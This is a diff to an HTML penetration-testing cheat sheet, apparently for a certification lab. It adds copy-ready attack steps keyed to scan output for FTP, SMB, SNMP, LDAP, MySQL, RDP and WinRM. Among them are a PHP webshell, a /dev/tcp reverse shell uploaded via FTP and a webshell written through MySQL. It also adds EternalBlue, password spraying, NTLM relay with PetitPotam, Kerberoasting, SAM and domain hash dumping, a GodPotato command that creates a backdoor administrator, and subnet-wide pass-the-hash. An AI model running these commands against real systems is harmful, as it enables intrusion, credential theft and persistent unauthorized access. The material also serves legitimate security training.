@@ -82,10 +82,17 @@
     .n-good  { background: #3fb95014; border: 1px solid #3fb95044; color: var(--green); }
 
     /* SIGNAL BOX */
-    .sig { background: var(--code-bg); border: 1px solid var(--border2); border-left: 3px solid var(--yellow); border-radius: 6px; padding: 11px 13px; margin: 0.75rem 0; font-family: var(--mono); font-size: 0.78rem; line-height: 1.95; }
-    .sig-title { font-size: 0.65rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--yellow); margin-bottom: 7px; display: block; }
+    .sig { background: var(--code-bg); border: 1px solid var(--border2); border-left: 3px solid var(--yellow); border-radius: 6px; padding: 11px 13px; margin: 0.75rem 0; font-family: var(--mono); font-size: 0.78rem; line-height: 1.7; }
+    .sig-title { font-size: 0.65rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--yellow); margin-bottom: 10px; display: block; }
     .so { color: var(--muted); }
     .sa { color: var(--green); }
+    .sig-entry { margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border); }
+    .sig-entry:last-child { margin-bottom: 0; padding-bottom: 0; border-bottom: none; }
+    .sig-signal { color: var(--muted); display: block; margin-bottom: 4px; }
+    .sig-label { color: var(--yellow); }
+    .sig-do { color: var(--dim); }
+    .sig-cmd { color: var(--green); display: block; padding-left: 1em; }
+    .sig-note { color: var(--dim); font-size: 0.73rem; padding-left: 1em; display: block; font-style: italic; }
 
     /* GRID */
     .two { display: grid; grid-template-columns: 1fr 1fr; gap: 0.9rem; }
@@ -165,7 +172,30 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://&lt;IP&gt; -t 10 -V</pr
 <span class="c"># Type: PASS anything</span>
 <span class="c"># Then immediately:</span>
 nc -nv &lt;IP&gt; 6200   <span class="c"># root shell on port 6200</span></pre></div>
-      <div class="note n-info">If FTP root = web root → upload webshell → curl http://&lt;IP&gt;/shell.php?cmd=id</div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">if FTP root = web root — webshell upload</span><div class="cb-tags"><span class="tag t-lin">linux</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Create webshell locally:</span>
+echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; webshell.php
+
+<span class="c"># Upload via FTP:</span>
+ftp &lt;IP&gt;
+<span class="c"># ftp&gt; put webshell.php</span>
+
+<span class="c"># Execute:</span>
+curl "http://&lt;IP&gt;/webshell.php?cmd=id"
+curl "http://&lt;IP&gt;/webshell.php?cmd=whoami"</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">if FTP root = web root — reverse shell upload</span><div class="cb-tags"><span class="tag t-crit">revshell</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Create revshell locally:</span>
+echo '&lt;?php exec("/bin/bash -c '\''bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1'\''"); ?&gt;' &gt; revshell.php
+
+<span class="c"># Upload via FTP:</span>
+ftp &lt;IP&gt;
+<span class="c"># ftp&gt; put revshell.php</span>
+
+<span class="c"># Start listener first:</span>
+nc -lvnp &lt;LPORT&gt;
+
+<span class="c"># Trigger:</span>
+curl "http://&lt;IP&gt;/revshell.php"</pre></div>
     </section>
 
     <!-- SSH -->
@@ -239,10 +269,21 @@ swaks --to target@&lt;domain&gt; --from attacker@evil.com --server &lt;IP&gt;:25
 <span class="c"># corp.local.        IN SOA   dc01.corp.local. ...</span>
 <span class="c"># dc01.corp.local.   IN A     10.10.10.10</span>
 <span class="c"># web.corp.local.    IN A     10.10.10.20    ← add to /etc/hosts</span>
-echo "&lt;IP&gt; &lt;hostname&gt;.&lt;domain&gt;" | sudo tee -a /etc/hosts
 
 host -l &lt;domain&gt; &lt;IP&gt;
 dnsrecon -d &lt;domain&gt; -t axfr -n &lt;IP&gt;</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">AXFR → parse A records → auto-add to /etc/hosts</span><div class="cb-tags"><span class="tag t-crit">try first</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># 1. Dump raw AXFR output:</span>
+dig axfr @&lt;IP&gt; &lt;domain&gt; &gt; axfr_output.txt
+
+<span class="c"># 2. Parse A records only → IP hostname pairs:</span>
+awk '$4 == "A" {print $5, $1}' axfr_output.txt &gt; hosts_entries.txt
+
+<span class="c"># 3. Review before adding:</span>
+cat hosts_entries.txt
+
+<span class="c"># 4. Append to /etc/hosts:</span>
+sudo tee -a /etc/hosts &lt; hosts_entries.txt</pre></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">subdomain brute force</span><button class="cpb" onclick="cp(this)">copy</button></div>
         <pre>gobuster dns -d &lt;domain&gt; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r &lt;IP&gt;
 dig @&lt;IP&gt; &lt;domain&gt; ANY
@@ -296,6 +337,41 @@ sudo mount -t cifs //&lt;IP&gt;/&lt;share&gt; /mnt/smb -o username=&lt;user&gt;,
 <span class="c"># Manual (github.com/worawit/MS17-010):</span>
 python3 checker.py &lt;IP&gt;
 python3 zzz_exploit.py &lt;IP&gt;</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Non-default share visible (Users, Data, Backup, etc.)</span>
+          <span class="sig-cmd">smbclient //&lt;IP&gt;/&lt;share&gt; -N <span class="sig-note">-- connect anonymously</span></span>
+          <span class="sig-cmd">smb: \&gt; recurse ON; prompt OFF; mget * <span class="sig-note">-- grab everything</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> smb-vuln-ms17-010: VULNERABLE</span>
+          <span class="sig-cmd">python3 checker.py &lt;IP&gt; <span class="sig-note">-- confirm named pipe</span></span>
+          <span class="sig-cmd">python3 zzz_exploit.py &lt;IP&gt; <span class="sig-note">-- manual exploit</span></span>
+          <span class="sig-cmd">msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS &lt;IP&gt;; set LHOST tun0; run" <span class="sig-note">-- MSF fallback</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Null session works — user:[john.doe] rid:[0x450]</span>
+          <span class="sig-cmd">rpcclient -U "" -N &lt;IP&gt; -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' &gt; users.txt <span class="sig-note">-- extract usernames</span></span>
+          <span class="sig-cmd">crackmapexec smb &lt;IP&gt; -u users.txt -p 'Password123!' --continue-on-success <span class="sig-note">-- spray</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> message_signing: disabled</span>
+          <span class="sig-cmd">sudo ntlmrelayx.py -tf targets.txt -smb2support <span class="sig-note">-- start relay listener</span></span>
+          <span class="sig-cmd">python3 PetitPotam.py &lt;KALI&gt; &lt;victim_IP&gt; <span class="sig-note">-- coerce auth</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> (Pwn3d!) on crackmapexec output</span>
+          <span class="sig-cmd">impacket-psexec &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt; <span class="sig-note">-- SYSTEM shell</span></span>
+          <span class="sig-cmd">impacket-wmiexec &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt; <span class="sig-note">-- quieter, no service install</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> description: Temp pass = Welcome2024</span>
+          <span class="sig-cmd">crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p 'Welcome2024' --continue-on-success <span class="sig-note">-- try SMB</span></span>
+          <span class="sig-cmd">crackmapexec winrm &lt;IP&gt; -u &lt;user&gt; -p 'Welcome2024' <span class="sig-note">-- try WinRM</span></span>
+          <span class="sig-cmd">ssh &lt;user&gt;@&lt;IP&gt; <span class="sig-note">-- try SSH</span></span>
+        </div>
+      </div>
     </section>
 
     <!-- SNMP -->
@@ -314,29 +390,34 @@ snmpwalk -c public -v2c &lt;IP&gt; 1.3.6.1.2.1.25.4.2.1.2   <span class="c"># ru
 snmpwalk -c public -v2c &lt;IP&gt; 1.3.6.1.2.1.25.6.3.1.2   <span class="c"># installed software</span>
 snmpwalk -c public -v2c &lt;IP&gt; 1.3.6.1.2.1.6.13.1.3     <span class="c"># open TCP ports</span></pre></div>
       <div class="sig">
-        <span class="sig-title">output signals — what you see → what to do</span>
-<span class="so">STRING: "Administrator"
-STRING: "svc_backup"
-STRING: "john.doe"</span>
-<span class="sa">→ USER ACCOUNTS. Build users.txt. Password spray:
-  crackmapexec smb &lt;IP&gt; -u users.txt -p 'Password123!' --continue-on-success</span>
-
-<span class="so">STRING: "C:\xampp\apache\bin\httpd.exe"
-STRING: "C:\Program Files\FileZilla Server\FileZilla Server.exe"</span>
-<span class="sa">→ RUNNING PROCESSES / INSTALLED SOFTWARE. searchsploit each version.</span>
-
-<span class="so">INTEGER: 22
-INTEGER: 3306
-INTEGER: 8080</span>
-<span class="sa">→ OPEN PORTS nmap may have missed. Add to targeted scan immediately:
-  sudo nmap -p 8080,3306 -sC -sV &lt;IP&gt;</span>
-
-<span class="so">STRING: "Password01!"
-STRING: "mysql://root:toor@localhost"</span>
-<span class="sa">→ PLAINTEXT CREDENTIALS. Try everywhere: SSH, SMB, RDP, WinRM, web login.</span>
-
-<span class="so">Timeout / no response</span>
-<span class="sa">→ Wrong community string. Try v1: snmpwalk -c public -v1 &lt;IP&gt;</span>
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> STRING: "Administrator" / "svc_backup" / "john.doe"</span>
+          <span class="sig-cmd">snmpwalk -c public -v2c &lt;IP&gt; 1.3.6.1.4.1.77.1.2.25 | grep -oP '".*?"' | tr -d '"' &gt; users.txt <span class="sig-note">-- extract Windows users</span></span>
+          <span class="sig-cmd">crackmapexec smb &lt;IP&gt; -u users.txt -p 'Password123!' --continue-on-success <span class="sig-note">-- spray</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> STRING: "C:\xampp\apache\bin\httpd.exe" / running process with version</span>
+          <span class="sig-cmd">searchsploit xampp 7.4 <span class="sig-note">-- replace service + version from output</span></span>
+          <span class="sig-cmd">searchsploit filezilla server 0.9</span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> INTEGER: 8080 / 3306 / 22 (port nmap missed)</span>
+          <span class="sig-cmd">sudo nmap -p &lt;ports&gt; -sC -sV &lt;IP&gt; -oN ~/exam/loot/snmp_ports.txt <span class="sig-note">-- targeted scan on discovered ports</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> STRING: "Password01!" / "mysql://root:toor@localhost"</span>
+          <span class="sig-cmd">crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p 'Password01!' --continue-on-success <span class="sig-note">-- try SMB</span></span>
+          <span class="sig-cmd">crackmapexec winrm &lt;IP&gt; -u &lt;user&gt; -p 'Password01!' <span class="sig-note">-- try WinRM</span></span>
+          <span class="sig-cmd">ssh &lt;user&gt;@&lt;IP&gt; <span class="sig-note">-- try SSH</span></span>
+          <span class="sig-cmd">mysql -u root -p'toor' -h &lt;IP&gt; <span class="sig-note">-- try MySQL if port open</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Timeout / no response on snmpwalk</span>
+          <span class="sig-cmd">onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt &lt;IP&gt; <span class="sig-note">-- brute community string</span></span>
+          <span class="sig-cmd">snmpwalk -c public -v1 &lt;IP&gt; <span class="sig-note">-- fallback to v1</span></span>
+          <span class="sig-cmd">snmpwalk -c private -v2c &lt;IP&gt; <span class="sig-note">-- try private community string</span></span>
+        </div>
       </div>
     </section>
 
@@ -362,31 +443,44 @@ grep "description:" ~/exam/loot/ldap_users.txt | grep -iv "built-in\|default\|ac
 python3 windapsearch.py --dc-ip &lt;IP&gt; -u "" -U               <span class="c"># all users, anon</span>
 python3 windapsearch.py --dc-ip &lt;IP&gt; -u "&lt;user&gt;@corp.local" -p '&lt;pass&gt;' --da  <span class="c"># DA members</span></pre></div>
       <div class="sig">
-        <span class="sig-title">output signals — what you see → what to do</span>
-<span class="so">namingContexts: DC=corp,DC=local</span>
-<span class="sa">→ ANON BIND WORKS. Use DC=corp,DC=local as -b in all further queries.</span>
-
-<span class="so">sAMAccountName: john.doe
-sAMAccountName: svc_mssql</span>
-<span class="sa">→ USER LIST. Save to users.txt. Use for spray, Kerberoasting, AS-REP roasting.</span>
-
-<span class="so">description: Password is Welcome2024!
-description: Temp pass=P@ssw0rd1, change later</span>
-<span class="sa">→ CREDENTIAL IN DESCRIPTION (very common). Try immediately everywhere.</span>
-
-<span class="so">servicePrincipalName: MSSQLSvc/dc01.corp.local:1433</span>
-<span class="sa">→ KERBEROASTABLE. Run immediately:
-  impacket-GetUserSPNs corp.local/&lt;user&gt;:&lt;pass&gt; -dc-ip &lt;DC_IP&gt; -request</span>
-
-<span class="so">userAccountControl: 4194304</span>
-<span class="sa">→ DONT_REQ_PREAUTH = AS-REP ROASTABLE. Run:
-  impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip &lt;DC_IP&gt; -no-pass -format hashcat</span>
-
-<span class="so">memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local</span>
-<span class="sa">→ THIS USER IS A DA. Focus all lateral movement on this account.</span>
-
-<span class="so">Operations error (1)  /  Insufficient access rights (50)</span>
-<span class="sa">→ ANON BIND DENIED. Get creds first via SNMP user enum + spray.</span>
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> namingContexts: DC=corp,DC=local</span>
+          <span class="sig-cmd">ldapsearch -x -H ldap://&lt;IP&gt; -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description memberOf userAccountControl servicePrincipalName 2&gt;/dev/null | tee ~/exam/loot/ldap_users.txt <span class="sig-note">-- anon bind works, dump everything</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> sAMAccountName: john.doe / svc_mssql</span>
+          <span class="sig-cmd">grep "sAMAccountName:" ~/exam/loot/ldap_users.txt | awk '{print $2}' &gt; users.txt <span class="sig-note">-- extract to users.txt</span></span>
+          <span class="sig-cmd">crackmapexec smb &lt;IP&gt; -u users.txt -p 'Password123!' --continue-on-success <span class="sig-note">-- spray</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> description: Password is Welcome2024! / Temp pass=P@ssw0rd1</span>
+          <span class="sig-cmd">grep "description:" ~/exam/loot/ldap_users.txt | grep -iv "built-in\|default\|accounts" <span class="sig-note">-- filter noise</span></span>
+          <span class="sig-cmd">crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p '&lt;found_pass&gt;' --continue-on-success <span class="sig-note">-- try SMB</span></span>
+          <span class="sig-cmd">crackmapexec winrm &lt;IP&gt; -u &lt;user&gt; -p '&lt;found_pass&gt;' <span class="sig-note">-- try WinRM</span></span>
+          <span class="sig-cmd">ssh &lt;user&gt;@&lt;IP&gt; <span class="sig-note">-- try SSH</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> servicePrincipalName: MSSQLSvc/dc01.corp.local:1433</span>
+          <span class="sig-cmd">impacket-GetUserSPNs corp.local/&lt;user&gt;:&lt;pass&gt; -dc-ip &lt;DC_IP&gt; -request -outputfile kerberoast.hash <span class="sig-note">-- request TGS</span></span>
+          <span class="sig-cmd">hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt <span class="sig-note">-- crack TGS</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> userAccountControl: 4194304 (DONT_REQ_PREAUTH)</span>
+          <span class="sig-cmd">impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip &lt;DC_IP&gt; -no-pass -format hashcat -outputfile asrep.hash <span class="sig-note">-- AS-REP roast</span></span>
+          <span class="sig-cmd">hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt <span class="sig-note">-- crack AS-REP hash</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local</span>
+          <span class="sig-cmd">impacket-psexec corp.local/&lt;user&gt;:'&lt;pass&gt;'@&lt;DC_IP&gt; <span class="sig-note">-- DA shell</span></span>
+          <span class="sig-cmd">impacket-secretsdump corp.local/&lt;user&gt;:'&lt;pass&gt;'@&lt;DC_IP&gt; <span class="sig-note">-- full domain hash dump</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Operations error (1) / Insufficient access rights (50)</span>
+          <span class="sig-cmd">snmpwalk -c public -v2c &lt;IP&gt; 1.3.6.1.4.1.77.1.2.25 | grep -oP '".*?"' | tr -d '"' &gt; users.txt <span class="sig-note">-- get users via SNMP instead</span></span>
+          <span class="sig-cmd">crackmapexec smb &lt;IP&gt; -u users.txt -p 'Password123!' --continue-on-success <span class="sig-note">-- spray for valid creds</span></span>
+          <span class="sig-cmd">ldapsearch -x -H ldap://&lt;IP&gt; -D "&lt;user&gt;@corp.local" -w '&lt;pass&gt;' -b "DC=corp,DC=local" "(objectClass=user)" <span class="sig-note">-- retry with creds</span></span>
+        </div>
       </div>
     </section>
 
@@ -435,6 +529,32 @@ select load_file('/etc/passwd');    <span class="c">-- read file</span>
 select "&lt;?php system($_GET['cmd']); ?&gt;" into outfile '/var/www/html/shell.php';  <span class="c">-- write webshell</span>
 
 nmap -p3306 --script mysql-info,mysql-empty-password,mysql-brute &lt;IP&gt;</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Welcome to the MySQL monitor... (root, no password)</span>
+          <span class="sig-cmd">select user,authentication_string from mysql.user; <span class="sig-note">-- dump hashes</span></span>
+          <span class="sig-cmd">select @@global.secure_file_priv; <span class="sig-note">-- '' or NULL = file r/w enabled</span></span>
+          <span class="sig-cmd">show databases; <span class="sig-note">-- look for CMS DBs</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> @@global.secure_file_priv = '' or NULL</span>
+          <span class="sig-cmd">select "&lt;?php system($_GET['cmd']); ?&gt;" into outfile '/var/www/html/shell.php'; <span class="sig-note">-- write webshell</span></span>
+          <span class="sig-cmd">curl "http://&lt;IP&gt;/shell.php?cmd=id" <span class="sig-note">-- verify RCE</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> database: wordpress / joomla / drupal</span>
+          <span class="sig-cmd">use wordpress; select user_login,user_pass from wp_users; <span class="sig-note">-- WordPress</span></span>
+          <span class="sig-cmd">use joomla; select username,password from jos_users; <span class="sig-note">-- Joomla</span></span>
+          <span class="sig-cmd">hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt <span class="sig-note">-- WordPress phpass</span></span>
+          <span class="sig-cmd">hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt <span class="sig-note">-- bcrypt</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> ERROR 1045: Access denied for user 'root'@'%'</span>
+          <span class="sig-cmd">hydra -l root -P /usr/share/wordlists/rockyou.txt &lt;IP&gt; mysql <span class="sig-note">-- brute root</span></span>
+          <span class="sig-cmd">hydra -L users.txt -P /usr/share/wordlists/rockyou.txt &lt;IP&gt; mysql <span class="sig-note">-- brute all users</span></span>
+        </div>
+      </div>
     </section>
 
     <!-- RDP -->
@@ -445,6 +565,33 @@ nmap -p3306 --script mysql-info,mysql-empty-password,mysql-brute &lt;IP&gt;</pre
 xfreerdp /u:&lt;user&gt; /pth:&lt;NThash&gt; /v:&lt;IP&gt; /cert:ignore  <span class="c"># pass-the-hash</span>
 nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 &lt;IP&gt;
 crackmapexec rdp &lt;IP&gt; -u users.txt -p passwords.txt</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Authentication error (0x607) / NLA required</span>
+          <span class="sig-cmd">crackmapexec rdp &lt;IP&gt; -u users.txt -p passwords.txt <span class="sig-note">-- spray first</span></span>
+          <span class="sig-cmd">xfreerdp /u:&lt;user&gt; /p:'&lt;pass&gt;' /v:&lt;IP&gt; /cert:ignore <span class="sig-note">-- connect once creds found</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> rdp-vuln-ms12-020: VULNERABLE</span>
+          <span class="sig-cmd">msfconsole -q -x "use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; set RHOSTS &lt;IP&gt;; run" <span class="sig-note">-- confirm scope before running, will crash box</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Desktop session opens successfully</span>
+          <span class="sig-cmd">query user <span class="sig-note">-- check other active sessions</span></span>
+          <span class="sig-cmd">cmdkey /list <span class="sig-note">-- saved credentials in Credential Manager</span></span>
+          <span class="sig-cmd">xfreerdp /u:&lt;user&gt; /p:'&lt;pass&gt;' /v:&lt;IP&gt; /cert:ignore /drive:kali,/tmp <span class="sig-note">-- reconnect with drive share for file transfer</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Account locked / too many failed attempts</span>
+          <span class="sig-cmd">crackmapexec smb &lt;IP&gt; -u &lt;valid_user&gt; -p &lt;pass&gt; --pass-pol <span class="sig-note">-- check lockout threshold + duration</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> xfreerdp /pth:&lt;hash&gt; connects successfully</span>
+          <span class="sig-cmd">crackmapexec rdp &lt;subnet&gt;/24 -u Administrator -H &lt;NThash&gt; <span class="sig-note">-- sweep same hash across subnet</span></span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u Administrator -H &lt;NThash&gt; --continue-on-success <span class="sig-note">-- check SMB access too</span></span>
+        </div>
+      </div>
     </section>
 
     <!-- WINRM -->
@@ -455,6 +602,36 @@ crackmapexec rdp &lt;IP&gt; -u users.txt -p passwords.txt</pre></div>
 evil-winrm -i &lt;IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;'
 evil-winrm -i &lt;IP&gt; -u &lt;user&gt; -H &lt;NThash&gt;
 <span class="c"># Built-ins: upload, download, menu, Bypass-4MSI</span></pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> (Pwn3d!) on crackmapexec winrm output</span>
+          <span class="sig-cmd">evil-winrm -i &lt;IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' <span class="sig-note">-- get shell</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> (Pwn3d!) with -H hash flag</span>
+          <span class="sig-cmd">crackmapexec winrm &lt;subnet&gt;/24 -u Administrator -H &lt;NThash&gt; <span class="sig-note">-- sweep hash across subnet</span></span>
+          <span class="sig-cmd">evil-winrm -i &lt;IP&gt; -u Administrator -H &lt;NThash&gt; <span class="sig-note">-- connect with hash, no plaintext needed</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Shell lands as service account (corp\svc_backup)</span>
+          <span class="sig-cmd">whoami /priv <span class="sig-note">-- check token privileges</span></span>
+          <span class="sig-cmd">reg save HKLM\SAM C:\Temp\sam.bak; reg save HKLM\SYSTEM C:\Temp\system.bak <span class="sig-note">-- if SeBackupPrivilege</span></span>
+          <span class="sig-cmd">download C:\Temp\sam.bak; download C:\Temp\system.bak <span class="sig-note">-- pull to kali</span></span>
+          <span class="sig-cmd">impacket-secretsdump -sam sam.bak -system system.bak LOCAL <span class="sig-note">-- dump hashes offline</span></span>
+          <span class="sig-cmd">.\GodPotato-NET4.exe -cmd "net user hacker P@ss123 /add &amp;&amp; net localgroup administrators hacker /add" <span class="sig-note">-- if SeImpersonatePrivilege</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Port 5985 open but all creds return [-]</span>
+          <span class="sig-cmd">crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -x "net localgroup 'Remote Management Users'" <span class="sig-note">-- find who has WinRM access</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Bypass-4MSI loaded in evil-winrm menu</span>
+          <span class="sig-cmd">upload /opt/tools/winPEAS.exe; .\winPEAS.exe <span class="sig-note">-- AMSI bypassed, run freely</span></span>
+          <span class="sig-cmd">upload /opt/tools/Rubeus.exe; .\Rubeus.exe kerberoast /outfile:hashes.txt <span class="sig-note">-- Kerberoast from inside</span></span>
+          <span class="sig-cmd">upload /opt/tools/SharpHound.exe; .\SharpHound.exe -c All <span class="sig-note">-- BloodHound collection</span></span>
+        </div>
+      </div>
     </section>
 
     <!-- HTTP ALT -->
